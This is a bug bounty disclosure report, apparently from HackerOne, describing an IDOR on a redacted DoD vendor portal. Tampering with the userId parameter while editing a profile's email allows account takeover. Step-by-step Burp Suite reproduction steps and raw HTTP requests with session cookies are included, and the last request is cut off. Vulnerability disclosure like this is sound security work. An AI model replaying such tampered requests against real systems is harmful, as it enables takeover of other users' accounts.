# IDOR when editing email leads to Mass Full ATOs (Account Takeovers) without user interaction on https://██████/

## Metadata
- **Source:** HackerOne
- **Report:** 1687415 | https://hackerone.com/reports/1687415
- **Submitted:** 2022-08-31
- **Reporter:** 696e746c6f6c
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Insecure Direct Object Reference (IDOR)
- **CVEs:** None
- **Category:** web-api

## Summary
Dear DoD team,

I found one critical bug on your domain: https://██████/
It's IDOR. Also this domain is from Hack US program.

What is that IDOR?

Insecure direct object references (IDOR) are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly. The term IDOR was popularized by its appearance in the OWASP 2007 Top Ten. However, 

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Dear DoD team,

I found one critical bug on your domain: https://██████/
It's IDOR. Also this domain is from Hack US program.

What is that IDOR?

Insecure direct object references (IDOR) are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly. The term IDOR was popularized by its appearance in the OWASP 2007 Top Ten. However, it is just one example of many access control implementation mistakes that can lead to access controls being circumvented. IDOR vulnerabilities are most commonly associated with horizontal privilege escalation, but they can also arise in relation to vertical privilege escalation.

## Impact

An attacker could do Full ATOs (Account Takeovers) to your users without any user interaction.

## System Host(s)
███

## Affected Product(s) and Version(s)
Users are affected.

## CVE Numbers


## Steps to Reproduce
1. Go to https://████████/
2. Go to vendor login.
3. Make one attacker account and one victim account.
4. Login as attacker.
5.  Go to My Account.
6. Update your profile and intercept your request with burp suite, make sure your foxy proxy is on, you will notice this request, take a look at userId parameter and save it your notepad:

```javascript
POST /█████/EditUserProfile/Save HTTP/1.1
Host: ███
Cookie: .AspNetCore.Antiforgery.w; TS014b77bb=; .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8NZcuopxrrlAnVqYGUtWQxtsA-gq_U4VzTT_UPVtffN4Mp5xSVzjEI6YzVkINoX_FoCmnYWsUdpP1PX2y57UYI527e0mBw40qounVa_WpXWkEiRpco5mBm8LQVC0y_XBbRbcAGbytrA24EqhocKSOupfTKtFzK-iB_2L9ekRNotla0UYoapvcWFDrQZ-KUQn0O65nIfoxkr6gu9jl3nhpy0; .AspNetAuth=CfDJ8NZcuopxrrlAnVqYGUtWQxuUeFWKVXEqlOxL4TNcHc5b0VL5A7Lnq1diP3edMqJn024bJDCv72IDREsFTjeownrswgIQhDCRm_pDHpxUl6_FRedhYqLjnIV5TzDmQgGT6_QoN5XVl-v9n2B5fmWKcfASedgyauzJzwBwafxFKjbIBpmm5oZoBHuDuVTUDFsreYhEbHVPoQDppRn2VhUQ5Vo-QjWelfM8Vi0R8XS98tC1r0j5npE_JKl-GcWXdtzXIgYLS9t9X05kp3a2dcTTUue33v_4taplSArGZzlHWHLYpMz3tLPE07hTkBrjvKCdpw; ASP.NET_SessionId=; TS0144f203=01d263603a2c7f22f24b6e3dc5545eac2dac86e22b777fbefec77dd724498f634cba9a604948cca126e23e438871080faec4034c4fabc579539aadf5f7b2713082206f08b6604332ce5d3a8f14b0f98a460f109128752513a960c47e1656d275e66a06feee; CSRF-TOKEN=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 537
Origin: https://████
Referer: https://████/██████████/EditUserProfile
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

Email=attacker@gmail.com&PositionTitleIds=10&Title=Pentester&FirstName=attacking&MiddleName=test&LastName=wearehackerone&PhoneNumber=&LanguageId=&Password=&ConfirmPassword=&userId=123464&passChange=true&PersonProfileId=0&CitizenshipId=101&__RequestVerificationToken=
```
6.  Change email to new email: example I changed to this email: █████████ or to ███████
7. But make sure you created victim account.  So, change it to the victim email.
8. Before you change your email, make sure to turn your foxy proxy on and open your burp suite.
9. Now change to victim email.
10. In http history (in Burp Suite) you will notice this request:

```javascript
POST /███/EditUserProfile/Save HTTP/1.1
Host: █████████
Cookie: .AspNetCore.Antiforgery.w; TS014b77bb=; .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8NZcuopxrrlAnVqYGUtWQxtsA-gq_U4VzTT_UPVtffN4Mp5xSVzjEI6YzVkINoX_FoCmnYWsUdpP1PX2y57UYI527e0mBw40qounVa_WpXWkEiRpco5mBm8LQVC0y_XBbRbcAGbytrA24EqhocKSOupfTKtFzK-iB_2L9ekRNotla0UYoapvcWFDrQZ-KUQn0O65nIfoxkr6gu9jl3nhpy0; .AspNetAuth=CfDJ8NZcuopxrrlAnVqYGUtWQxuUeFWKVXEqlOxL4TNcHc5b0VL5A7Lnq1diP3edMqJn024bJDCv72IDREsFTjeownrswgIQhDCRm_pDHpxUl6_FRedhYqLjnIV5TzDmQgGT6_QoN5XVl-v9n2B5fmWKcfASedgyauzJzwBwafxFKjbIBpmm5oZoBHuDuVTUDFsreYhEbHVPoQDppRn2VhUQ5Vo-QjWelfM8Vi0R8XS98tC1r0j5npE_JKl-GcWXdtzXIgYLS9t9X05kp3a2dcTTUue33v_4taplSArGZzlHWHLYpMz3tLPE07hTkBrjvKCdpw; ASP.NET_SessionId=; TS0144f203=01d263603a2c7f22f24b6e3dc5545eac2dac86e22b777fbefec77dd724498f634cba9a604948cca126e23e438871080faec4034c4fabc579539aadf5f7b2713082206f08b6604332ce5d3a8f14b0f98a460f109128752513a960c47e1656d275e66a06feee; CSRF-TOKEN=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 537
Origin: https://█████████
Referer: https://████████/█████████/EditUserProfile
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

Email=victim@gmail.com&PositionTitleIds=10&Title=Pentester&FirstName=attacking&MiddleName=test&LastName=wearehackerone&PhoneNumber=&LanguageId=&Password=&ConfirmPassword=&userId=123464&passChange=true&PersonProfileId=0&CitizenshipId=101&__RequestVerificationToken=
```
11. In request you can see userId parameter is same from attacker request and from victims request. It doesn't change userId when you update your email.
12. In request, change the ID to your test account's ID.
13. Before changing ID to test account's ID. All you need to do is to create a new account (test account). For test account I was using this email: ██████████
14. If you created test account make sure to turn your foxy proxy on, update your profile and intercept request in your burp suite again.
15. The request should look like this:

```javascript
POST /██████/EditUserProfile/Save HTTP/1.1
Host: ████
Cookie: .AspNetCore.Antiforgery.wZhPOrJ1UhI=CfDJ8NZcuopxrrlAnVqYGUtWQxsyCkGcg0td-ibNe1xIz0u9vm0G-3YwB0P4pSz9OK3QW7SjqdtIdekPY2dPaTat-4pZV-LVeV4tcpazySNA7oIlAih4hGDkWTuUs2TI-NgpY-bdb_cpfQPMg_0qx4HY0CM; TS014b77bb=01d263603a4b90fe81b65bf9d005a81063a1713f030e4e41c68b2e6fdfbcecaf00d41797072a17934e13dae1d4626a7264e9bc4f7962ab399dbbaff75c4d644373978659f05f20018a54e327147891c13e878cb24901785f34934c770f169bd0a39c9e7a1898d41e3487a0ac3992f8549369d38e26; .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8NZcuopxrrlAnVqYGUtWQxtsA-gq_U4VzTT_UPVtffN4Mp5xSVzjEI6YzVkINoX_FoCmnYWsUdpP1PX2y57UYI527e0mBw40qounVa_WpXWkEiRpco5mBm8LQVC0y_XBbRbcAGbytrA24EqhocKSOupfTKtFzK-iB_2L9ekRNotla0UYoapvcWFDrQZ-KUQn0O65nIfoxkr6gu9jl3nhpy0; .AspNetAuth=CfDJ8NZcuopxrrlAnVqYGUtWQxuUeFWKVXEqlOxL4TNcHc5b0VL5A7Lnq1diP3edMqJn024bJDCv72IDREsFTjeownrswgIQhDCRm_pDHpxUl6_FRedhYqLjnIV5TzDmQgGT6_QoN5XVl-v9n2B5fmWKcfASedgyauzJzwBwafxFKjbIBpmm5oZoBHuDuVTUDFsreYhEbHVPoQDppRn2VhUQ5Vo-QjWelfM8Vi0R8XS98tC1r0j5npE_JKl-GcWXdtzXIgYLS9t9X05kp3a2dcTTUue33v_4taplSArGZzlHWHLYpMz3tLPE07hTkBrjvKCdpw; ASP.NET_SessionId=eu31ysfgzyfgxalotfr1jp0x; TS0144f203=01d263603a2c7f22f24b6e3dc5545eac2dac86e22b777fbefec77dd724498f634cba9a604948cca126e23e438871080faec4034c4fabc579539aadf5f7b2713082206f08b6604332ce5d3a8f14b0f98a460f109128752513a960c47e1656d275e66a06feee; CSRF-TOKEN=CfDJ8NZcuopxrrlAnVqYGUtWQxuZMGHTc_PA-LxOQs4LufNUd6SlvBQuwui60roGtUVF6HwaLVOFDk0k4sUrUeJU86NEjNXrbhMY7kJwsA3PmoZw_IT-KFt-kkjbhKz2h_XDzBPCTBsF6xsmvpwMYWnDghE; .AspNetCore.Session=CfDJ8NZcuopxrrlAnVqYGUtWQxui3s4%2B%2FcvDV9iqxakLoPTv9z5kxzKLAjyD1w6iEU%2FcOSjWCKPHXJ7Pzw2199TWmi2x19gHCh4kZh9xG7SqQGGB2nvBSih7M6qtUVbbOkY0oN09QJzXWhcx3HwFysw3OebYvivXRjsW6dzGb0zdpgaa
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 537
Origin: https://███
Referer: https://██████████/████████/EditUserProfile
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate

</details>

---
*Analysed by Claude on 2026-05-24*
